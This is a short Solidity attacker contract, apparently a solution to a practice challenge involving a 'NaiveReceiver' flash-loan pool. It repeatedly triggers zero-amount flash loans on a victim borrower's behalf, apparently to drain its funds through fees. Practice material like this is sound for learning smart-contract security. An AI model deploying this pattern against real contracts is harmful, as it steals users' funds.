// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool private immutable pool;

    constructor(address payable pool_) {
        pool = NaiveReceiverLenderPool(pool_);
    }

    function attack(address borrower_) public {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(borrower_, 0);
        }
    }
}
